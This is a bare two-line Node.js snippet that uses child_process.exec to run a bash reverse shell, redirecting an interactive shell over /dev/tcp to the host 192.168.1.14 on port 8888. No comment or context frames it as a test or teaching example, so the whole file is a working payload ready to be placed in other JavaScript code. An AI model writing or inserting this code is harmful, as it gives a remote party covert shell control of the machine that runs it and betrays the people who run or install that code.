const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/192.168.1.14/8888 0>&1');
